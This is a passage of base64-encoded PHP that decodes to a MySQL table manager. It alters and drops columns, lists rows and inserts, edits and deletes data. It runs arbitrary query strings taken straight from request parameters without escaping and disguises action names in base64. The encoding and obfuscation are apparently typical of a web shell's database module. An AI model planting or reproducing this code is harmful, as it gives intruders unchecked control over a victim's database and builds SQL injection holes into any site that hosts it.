QUREICRuYW1lICI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKQ0KCQkkcXVlcnlTdHIgPSAiQUxURVIgVEFCTEUgJHRhYmxlbmFtZSBDSEFOR0UgJG9sZF9uYW1lICRuYW1lICI7DQoJaWYoICRNICE9ICIiICkNCgkJaWYoICREICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0sJEQpICI7DQoJCWVsc2UNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0pICI7DQoJZWxzZSBpZiggJHZhbHVlbGlzdCAhPSAiIiApIHsNCgkJJHZhbHVlbGlzdCA9IHN0cmlwc2xhc2hlcyggJHZhbHVlbGlzdCApOw0KCQkkcXVlcnlTdHIgLj0gIiR0eXBlKCR2YWx1ZWxpc3QpICI7DQoJfSBlbHNlDQoJCSRxdWVyeVN0ciAuPSAiJHR5cGUgIjsNCgkkcXVlcnlTdHIgLj0gIiR1bnNpZ25lZCAkemVyb2ZpbGwgJGJpbmFyeSAiOw0KCWlmKCAkZGVmYXVsdF92YWx1ZSAhPSAiIiApDQoJCSRxdWVyeVN0ciAuPSAiREVGQVVMVCAnJGRlZmF1bHRfdmFsdWUnICI7DQoJJHF1ZXJ5U3RyIC49ICIkbm90X251bGwgJGF1dG9faW5jcmVtZW50IjsNCglteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCS8vIGtleSBjaGFuZ2UNCgkka2V5Q2hhbmdlID0gZmFsc2U7DQoJJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAiU0hPVyBLRVlTIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkcHJpbWFyeSA9ICIiOw0KCXdoaWxlKCAkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkgKQ0KCQlpZiggJHJvd1siS2V5X25hbWUiXSA9PSAiUFJJTUFSWSIgKSB7DQoJCQlpZiggJHJvd1tDb2x1bW5fbmFtZV0gPT0gJG5hbWUgKQ0KCQkJCSRrZXlDaGFuZ2UgPSB0cnVlOw0KCQkJZWxzZQ0KCQkJCSRwcmltYXJ5IC49ICIsICRyb3dbQ29sdW1uX25hbWVdIjsNCgkJfQ0KCWlmKCAkcHJpbWFyeV9rZXkgPT0gIlBSSU1BUlkgS0VZIiApIHsNCgkJJHByaW1hcnkgLj0gIiwgJG5hbWUiOw0KCQkka2V5Q2hhbmdlID0gISRrZXlDaGFuZ2U7DQoJfQ0KCSRwcmltYXJ5ID0gc3Vic3RyKCAkcHJpbWFyeSwgMiApOw0KCWlmKCAka2V5Q2hhbmdlID09IHRydWUgKSB7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBQUklNQVJZIEtFWSI7DQoJCW15c3FsX3F1ZXJ5KCAkcSApOw0KCQkkcXVlcnlTdHIgLj0gIjxicj5cbiIgLiAkcTsNCgkJJGVyck1zZyAuPSAiPGJyPlxuIiAuIG15c3FsX2Vycm9yKCk7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREIFBSSU1BUlkgS0VZKCAkcHJpbWFyeSApIjsNCgkJbXlzcWxfcXVlcnkoICRxICk7DQoJCSRxdWVyeVN0ciAuPSAiPGJyPlxuIiAuICRxOw0KCQkkZXJyTXNnIC49ICI8YnI+XG4iIC4gbXlzcWxfZXJyb3IoKTsNCgl9DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRmllbGQoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBDT0xVTU4gJGZpZWxkbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiB2aWV3RGF0YSggJHF1ZXJ5U3RyICkgew0KCWdsb2JhbCAkYWN0aW9uLCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICR0YWJsZW5hbWUsICRQSFBfU0VMRiwgJGVyck1zZywgJHBhZ2UsICRyb3dwZXJwYWdlLCAkb3JkZXJieTsNCgllY2hvICI8aDE+RGF0YSBpbiBUYWJsZTwvaDE+XG4iOw0KCWlmKCAkdGFibGVuYW1lICE9ICIiICkNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZSAmZ3Q7ICR0YWJsZW5hbWU8L3A+XG4iOw0KCWVsc2UNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJJHF1ZXJ5U3RyID0gc3RyaXBzbGFzaGVzKCAkcXVlcnlTdHIgKTsNCglpZiggJHF1ZXJ5U3RyID09ICIiICkgew0KCQkkcXVlcnlTdHIgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiIE9SREVSIEJZICRvcmRlcmJ5IjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1hZGREYXRhJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRGF0YTwvYT4gfCBcbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgl9DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgJHF1ZXJ5U3RyICk7DQoJJGZpZWxkdCA9IG15c3FsX2ZldGNoX2ZpZWxkKCRwUmVzdWx0KTsNCgkkdGFibGVuYW1lID0gJGZpZWxkdC0+dGFibGU7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJJEdMT0JBTFNbcXVlcnlTdHJdID0gJHF1ZXJ5U3RyOw0KCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJCXJldHVybjsNCgl9DQoJaWYoICRwUmVzdWx0ID09IDEgKSB7DQoJCSRlcnJNc2cgPSAiU3VjY2VzcyI7DQoJCWVjaG9RdWVyeVJlc3VsdCgpOw0KCQlyZXR1cm47DQoJfQ0KCWVjaG8gIjxocj5cbiI7DQoJJHJvdyA9IG15c3FsX251bV9yb3dzKCAkcFJlc3VsdCApOw0KCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCWlmKCAkcm93ID09IDAgKSB7DQoJCWVjaG8gIk5vIERhdGEgRXhpc3QhIjsNCgkJcmV0dXJuOw0KCX0NCglpZiggJHJvd3BlcnBhZ2UgPT0gIiIgKSAkcm93cGVycGFnZSA9IDMwOw0KCWlmKCAkcGFnZSA9PSAiIiApICRwYWdlID0gMDsNCgllbHNlICRwYWdlLS07DQoJbXlzcWxfZGF0YV9zZWVrKCAkcFJlc3VsdCwgJHBhZ2UgKiAkcm93cGVycGFnZSApOw0KCWVjaG8gIjx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTI+XG4iOw0KCWVjaG8gIjx0cj5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQllY2hvICI8dGg+IjsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJm9yZGVyYnk9Ii4kZmllbGQtPm5hbWUuIic+Ii4kZmllbGQtPm5hbWUuIjwvYT5cbiI7DQoJCWVsc2UNCgkJCWVjaG8gJGZpZWxkLT5uYW1lLiJcbiI7DQoJCWVjaG8gIjwvdGg+XG4iOw0KCX0NCgllY2hvICI8dGggY29sc3Bhbj0yPkFjdGlvbjwvdGg+XG4iOw0KCWVjaG8gIjwvdHI+XG4iOw0KCWZvciggJGkgPSAwOyAkaSA8ICRyb3dwZXJwYWdlOyAkaSsrICkgew0KCQkkcm93QXJyYXkgPSBteXNxbF9mZXRjaF9yb3coICRwUmVzdWx0ICk7DQoJCWlmKCAkcm93QXJyYXkgPT0gZmFsc2UgKSBicmVhazsNCgkJZWNobyAiPHRyPlxuIjsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRqID0gMDsgJGogPCAkY29sOyAkaisrICkgew0KCQkJJGRhdGEgPSAkcm93QXJyYXlbJGpdOw0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaiApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJJGtleSAuPSAiJiIgLiAkZmllbGQtPm5hbWUgLiAiPSIgLiAkZGF0YTsNCgkJCWlmKCBzdHJsZW4oICRkYXRhICkgPiAzMCApDQoJCQkJJGRhdGEgPSBzdWJzdHIoICRkYXRhLCAwLCAzMCApIC4gIi4uLiI7DQoJCQkkZGF0YSA9IGh0bWxzcGVjaWFsY2hhcnMoICRkYXRhICk7DQoJCQllY2hvICI8dGQ+XG4iOw0KCQkJZWNobyAiJGRhdGFcbiI7DQoJCQllY2hvICI8L3RkPlxuIjsNCgkJfQ0KCQlpZiggJGtleSA9PSAiIiApDQoJCQllY2hvICI8dGQgY29sc3Bhbj0yPm5vIEtleTwvdGQ+XG4iOw0KCQllbHNlIHsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWVkaXREYXRhJGtleSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+RWRpdDwvYT48L3RkPlxuIjsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWRlbGV0ZURhdGEka2V5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0RlbGV0ZSBSb3c/JylcIj5EZWxldGU8L2E+PC90ZD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+XG4iOw0KCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlxuIjsNCglpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWxzZQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249cXVlcnkmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcXVlcnlTdHI9JHF1ZXJ5U3RyJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWNobyAoJHBhZ2UrMSkuIi8iLihpbnQpKCRyb3cvJHJvd3BlcnBhZ2UrMSkuIiBwYWdlIjsNCgllY2hvICI8L2ZvbnQ+XG4iOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRwYWdlID4gMCApIHsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnBhZ2U9Ii4oJHBhZ2UpOw0KCQllbHNlDQoJCQllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXF1ZXJ5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnF1ZXJ5U3RyPSRxdWVyeVN0ciZwYWdlPSIuKCRwYWdlKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+UHJldjwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlByZXY8L2ZvbnQ+IjsNCgllY2hvICIgfCAiOw0KCWlmKCAkcGFnZSA8ICgkcm93LyRyb3dwZXJwYWdlKS0xICkgew0KCQlpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kbWxsZDBSaGRHRT0mZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcGFnZT0iLigkcGFnZSsyKTsNCgkJZWxzZQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1xdWVyeSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSZxdWVyeVN0cj0kcXVlcnlTdHImcGFnZT0iLigkcGFnZSsyKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+TmV4dDwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIk5leHQiOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRyb3cgPiAkcm93cGVycGFnZSApIHsNCgkJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBzaXplPTQgbmFtZT1wYWdlPlxuIjsNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdHbyc+XG4iOw0KCX0NCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjwvZm9udD5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZURhdGEoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBEYXRhPC9oMT5cbiI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKSB7DQoJCWVjaG8gIjxoMT5FZGl0IERhdGE8L2gxPlxuIjsNCgkJJHBSZXN1bHQgPSBteXNxbF9saXN0X2ZpZWxkcyggJGRibmFtZSwgJHRhYmxlbmFtZSApOw0KCQkkbnVtID0gbXlzcWxfbnVtX2ZpZWxkcyggJHBSZXN1bHQgKTsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRpID0gMDsgJGkgPCAkbnVtOyAkaSsrICkgew0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkNCgkJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSIgLiAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIiBBTkQgIjsNCgkJCQllbHNlDQoJCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0nIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJyBBTkQgIjsNCgkJfQ0KCQkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCQlteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCQkkcFJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgPSAgIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBXSEVSRSAka2V5IiwgJG15c3FsSGFuZGxlICk7DQoJCSRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJfQ0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRicgbWV0aG9kPXBvc3Q+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWFkZERhdGFfc3VibWl0PlxuIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1lZGl0RGF0YV9zdWJtaXQ+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10YWJsZW5hbWUgdmFsdWU9JHRhYmxlbmFtZT5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9Mj5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+TmFtZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5UeXBlPC90aD5cbiI7DQoJZWNobyAiPHRoPkZ1bmN0aW9uPC90aD5cbiI7DQoJZWNobyAiPHRoPkRhdGE8L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCgkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBSZXN1bHQgKTsNCgkkcFJlc3VsdExlbiA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJCSRmaWVsZG5hbWUgPSAkZmllbGRbIkZpZWxkIl07DQoJCSRmaWVsZHR5cGUgPSAkZmllbGRbIlR5cGUiXTsNCgkJJGxlbiA9IG15c3FsX2ZpZWxkX2xlbiggJHBSZXN1bHRMZW4sICRpICk7DQoJCWVjaG8gIjx0cj4iOw0KCQllY2hvICI8dGQ+JGZpZWxkbmFtZTwvdGQ+IjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJUeXBlIl0uIjwvdGQ+IjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiPHNlbGVjdCBuYW1lPSR7ZmllbGRuYW1lfV9mdW5jdGlvbj5cbiI7DQoJCWVjaG8gIjxvcHRpb24+XG4iOw0KCQllY2hvICI8b3B0aW9uPkFTQ0lJXG4iOw0KCQllY2hvICI8b3B0aW9uPkNIQVJcbiI7DQoJCWVjaG8gIjxvcHRpb24+U09VTkRFWFxuIjsNCgkJZWNobyAiPG9wdGlvbj5DVVJEQVRFXG4iOw0KCQllY2hvICI8b3B0aW9uPkNVUlRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+RlJPTV9EQVlTXG4iOw0KCQllY2hvICI8b3B0aW9uPkZST01fVU5JWFRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+Tk9XXG4iOw0KCQllY2hvICI8b3B0aW9uPlBBU1NXT1JEXG4iOw0KCQllY2hvICI8b3B0aW9uPlBFUklPRF9BRERcbiI7DQoJCWVjaG8gIjxvcHRpb24+UEVSSU9EX0RJRkZcbiI7DQoJCWVjaG8gIjxvcHRpb24+VE9fREFZU1xuIjsNCgkJZWNobyAiPG9wdGlvbj5VU0VSXG4iOw0KCQllY2hvICI8b3B0aW9uPldFRUtEQVlcbiI7DQoJCWVjaG8gIjxvcHRpb24+UkFORFxuIjsNCgkJZWNobyAiPC9zZWxlY3Q+XG4iOw0KCQllY2hvICI8L3RkPlxuIjsNCgkJJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkZGF0YVskaV0pOw0KCQlpZiggJGNtZCA9PSAiYWRkIiApIHsNCgkJCSR0eXBlID0gc3RydG9rKCAkZmllbGR0eXBlLCAiICgsKVxuIiApOw0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8fCAkdHlwZSA9PSAic2V0IiApIHsNCgkJCQllY2hvICI8dGQ+XG4iOw0KCQkJCWlmKCAkdHlwZSA9PSAiZW51bSIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZT5cbiI7DQoJCQkJZWxzZSBpZiggJHR5cGUgPT0gInNldCIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZSBzaXplPTQgbXVsdGlwbGU+XG4iOw0KCQkJCXdoaWxlKCAkc3RyID0gc3RydG9rKCAiJyIgKSApIHsNCgkJCQkJZWNobyAiPG9wdGlvbj4kc3RyXG4iOw0KCQkJCQlzdHJ0b2soICInIiApOw0KCQkJCX0NCgkJCQllY2hvICI8L3NlbGVjdD5cbiI7DQoJCQkJZWNobyAiPC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWlmKCAkbGVuIDwgNDAgKQ0KCQkJCQllY2hvICI8dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTQwIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT48L3RkPlxuIjsNCgkJCQllbHNlDQoJCQkJCWVjaG8gIjx0ZD48dGV4dGFyZWEgY29scz00MCByb3dzPTMgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lPjwvdGV4dGFyZWE+XG4iOw0KCQkJfQ0KCQl9IGVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCQlpZiggJHR5cGUgPT0gImVudW0iIHx8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCWVjaG8gIjx0ZD5cbiI7DQoJCQkJaWYoICR0eXBlID09ICJlbnVtIiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lPlxuIjsNCgkJCQllbHNlIGlmKCAkdHlwZSA9PSAic2V0IiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lIHNpemU9NCBtdWx0aXBsZT5cbiI7DQoJCQkJd2hpbGUoICRzdHIgPSBzdHJ0b2soICInIiApICkgew0KCQkJCQlpZiggJHZhbHVlID09ICRzdHIgKQ0KCQkJCQkJZWNobyAiPG9wdGlvbiBzZWxlY3RlZD4kc3RyXG4iOw0KCQkJCQllbHNlDQoJCQkJCQllY2hvICI8b3B0aW9uPiRzdHJcbiI7DQoJCQkJCXN0cnRvayggIiciICk7DQoJCQkJfQ0KCQkJCWVjaG8gIjwvc2VsZWN0PlxuIjsNCgkJCQllY2hvICI8L3RkPlxuIjsNCgkJCX0gZWxzZSB7DQoJCQkJaWYoICRsZW4gPCA0MCApDQoJCQkJCWVjaG8gIjx0ZD48aW5wdXQgdHlwZT10ZXh0IHNpemU9NDAgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lIHZhbHVlPVwiJHZhbHVlXCI+PC90ZD5cbiI7DQoJCQkJZWxzZQ0KCQkJCQllY2hvICI8dGQ+PHRleHRhcmVhIGNvbHM9NDAgcm93cz0zIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT4kdmFsdWU8L3RleHRhcmVhPlxuIjsNCgkJCX0NCgkJfQ0KCQllY2hvICI8L3RyPiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdBZGQgRGF0YSc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IERhdGEnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0NhbmNlbCcgb25DbGljaz0naGlzdG9yeS5iYWNrKCknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KfQ0KDQpmdW5jdGlvbiBtYW5hZ2VEYXRhX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCSRxdWVyeVN0ciA9ICJJTlNFUlQgSU5UTyAkdGFibGVuYW1lIFZBTFVFUyAoIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCSRxdWVyeVN0ciA9ICJSRVBMQUNFIElOVE8gJHRhYmxlbmFtZSBWQUxVRVMgKCI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bS0xOyAkaSsrICkgew0KCQkkZmllbGQgPSBteXNxbF9mZXRjaF9maWVsZCggJHBSZXN1bHQgKTsNCgkJJGZ1bmMgPSAkR0xPQkFMU1skZmllbGQtPm5hbWUuIl9mdW5jdGlvbiJdOw0KCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJJHF1ZXJ5U3RyIC49ICIgJGZ1bmMoIjsNCgkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkgew0KCQkJJHF1ZXJ5U3RyIC49ICRHTE9CQUxTWyRmaWVsZC0+bmFtZV07DQoJCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJCSRxdWVyeVN0ciAuPSAiKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiLCI7DQoJCX0gZWxzZSB7DQoJCQkkcXVlcnlTdHIgLj0gIiciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXTsNCgkJCWlmKCAkZnVuYyAhPSAiIiApDQoJCQkJJHF1ZXJ5U3RyIC49ICInKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiJywiOw0KCQl9DQoJfQ0KCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCApOw0KCWlmKCAkZmllbGQtPm51bWVyaWMgPT0gMSApDQoJCSRxdWVyeVN0ciAuPSAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIikiOw0KCWVsc2UNCgkJJHF1ZXJ5U3RyIC49ICInIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJykiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCgl2aWV3RGF0YSggIiIgKTsNCn0NCg0KZnVuY3Rpb24gZGVsZXRlRGF0YSgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJJGtleSA9ICIiOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQlpZiggJGZpZWxkLT5udW1lcmljID09IDEgKQ0KCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0iIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICIgQU5EICI7DQo